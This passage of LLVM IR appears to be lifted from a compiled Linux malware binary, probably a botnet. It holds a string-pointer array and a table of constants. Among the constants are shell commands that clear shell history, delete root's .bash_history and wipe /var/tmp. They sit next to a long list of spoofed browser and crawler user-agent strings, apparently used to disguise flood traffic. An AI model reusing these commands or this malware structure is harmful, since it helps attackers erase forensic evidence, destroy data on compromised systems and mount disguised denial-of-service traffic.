@global_var_19dd4.431, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19ddc.432, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19de0.433, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19de4.434, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19de8.435, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19dec.436, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19df0.437, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19df4.438, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19df8.439, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19dfc.440, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_19e00.441, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e14.442, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19e20.443, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19e2c.444, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19e34.445, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e3c.446, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e48.447, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19e54.448, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e5c.449, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19e68.450, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19e74.451, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19e80.452, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19d98.422, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19da0.423, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19e8c.453, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19e94.454, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19e9c.455, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19ea8.456, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19eb4.457, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19ebc.458, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19ec4.459, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19ed0.460, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19ed8.41, i32 0, i32 0), i8* bitcast (i32* @global_var_19edc.461 to i8*), i8* bitcast (i32* @global_var_19ee0.462 to i8*), i8* bitcast (i32* @global_var_19ee4.463 to i8*), i8* bitcast (i32* @global_var_19ee8.464 to i8*), i8* bitcast (i32* @global_var_19eec.465 to i8*), i8* bitcast (i32* @global_var_19ef0.466 to i8*), i8* bitcast (i32* @global_var_19ef4.467 to i8*), i8* bitcast (i32* @global_var_19ef8.468 to i8*), i8* bitcast (i32* @global_var_19efc.469 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f00.470, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f04.471, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f08.472, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f0c.473, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f10.474, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f14.475, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f18.476, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f1c.477, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f20.478, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f24.479, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19f28.480, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19f2c.481, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19f34.482, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19f3c.483, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19f44.484, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19f4c.485, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19f54.486, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f5c.487, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f64.488, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f6c.489, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19f74.490, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f80.491, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19f88.492, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19f90.493, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_19f9c.494, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19fa4.495, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19fac.496, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19fb4.497, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19fbc.498, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_19fc4.499, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19fcc.500, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_19fd4.501, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_19fe0.502, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_19fe8.503, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_19ff0.504, i32 0, i32 0)]
@global_var_1b0a0.511 = constant i32 34
@global_var_d100.512 = constant i32 436207626
@global_var_1b0a4.514 = constant [16 x i8] c"AAAAAAAAnetcore\00"
@global_var_1b0b8.516 = constant [3 x i8] c"AA\00"
@global_var_1b158.518 = constant [22 x i8] c"history -c;history -w\00"
@global_var_1b170.520 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_1b190.522 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_1b1d0.524 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_1b210.525 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_1b250.526 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_1b2e0.527 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_1b318.528 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_1b338.529 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1b350.530 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1b3a8.531 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_1b448.532 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_1b49c.533 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_1b510.534 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1b550.535 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_1b608.536 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_1b65c.537 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_1b6b4.538 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_1b70c.539 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_1b74c.540 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_1b794.541 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_1b7ec.542 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_1b858.543 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_1b8b0.544 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_1b900.545 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_1b924.546 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1b980.547 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1b990.548 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_1b9c0.549 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_1b9e4.550 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_1ba08.551 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_1ba24.552 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1ba64.553 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_1bab4.554 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_1bb00.555 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_1bb3c.556 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_1bb98.557 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_1bc00.558 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_1bc74.559 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_1bcec.560 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_1bd48.561 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_1bd9c.562 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_1be24.563 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1be78.564 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_1bee0.565 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_1bf3c.566 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_1bf8c.567 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_1bfd0.568 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_1c024.569 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_1c070.570 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1c0b4.571 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_1c108.572 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_1c174.573 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_1c1e4.574 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_1c240.575 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_1c2b4.576 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_1c324.577 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_1c3bc.578 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_1c408.579 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_1c470.580 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_1c4ac.581 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_1c4dc.582 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_1c51c.583 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00"
@global_var_1c568.584 = constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_1c5bc.585 = constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00"
@global_var_1c66c.586 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_1c6d4.587 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_1c73c.588 = constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00"
@global_var_1c78c.589 = constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00"
@global_var_1c7c4.590 = constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00"
@global_var_1c7f4.591 = constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1c850.592 = constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1c8bc.593 = constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1c924.594 = constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1c97c.595 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1c9d8.596 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_1ca34.597 = constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00"
@global_var_1ca8c.598 = constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00"
@global_var_1caec.599 = constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00"
@global_var_1cb50.600 = constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00"
@global_var_1cb7c.601 = constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00"
@global_var_1cbb0.602 = constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00"
@global_var_1cbd0.603 = constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00"
@global_var_1cbf0.604 = constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1cc48.605 = constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_1cca8.606 = constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1cd00.607 = constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_1cd60.608 = constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_1cdb8.609 = constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00"
@global_var_1cdd8.610 = constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00"
@global_var_1ce00.611 = constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1ce40.612 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1ce88.613 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1ced0.614 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1cf18.615 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1cf60.616 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_1cfb4.617 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_1d004.618 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_1d070.619 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_1d0c4.620 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_1d120.621 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_1d17c.622 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_1d1e0.623 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_1d23c.624 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1d298.625 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1d2f4.626 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1d354.627 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_1d39c.628 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_1d434.629 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_1d480.630 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1d4cc.631 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_1d51c.632 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_1d564.633 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_1d5b8.634 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_1d608.635 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_1d650.636 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_1d69c.637 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1d6e8.638 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_1d730.639 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1d780.640 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1d7d0.641 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1d804.642 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1d838.643 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_1d880.644 = constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00"
@global_var_1d8b8.645 = constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00"
@global_var_1d908.646 = constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00"
@global_var_1d94c.647 = constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00"
@global_var_1d97c.648 = constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00"
@global_var_1d9ac.649 = constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00"
@global_var_1d9dc.650 = constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00"
@global_var_1da0c.651 = constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00"
@global_var_1da54.652 = constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00"
@global_var_1da9c.653 = constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00"
@global_var_1dad4.654 = constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00"
@global_var_1db0c.655 = constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00"
@global_var_1db44.656 = constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00"
@global_var_1db7c.657 = constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00"
@global_var_1dbb4.658 = constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00"
@global_var_1dc08.659 = constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00"
@global_var_1dc40.660 = constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00"
@global_var_1dc94.661 = constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00"
@global_var_1dd08.662 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00"
@global_var_1dd50.663 = constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00"
@global_var_1ddc8.664 = constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00"
@global_var_1ddfc.665 = constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00"
@global_var_1de20.666 = constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00"
@global_var_1dea8.667 = constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00"
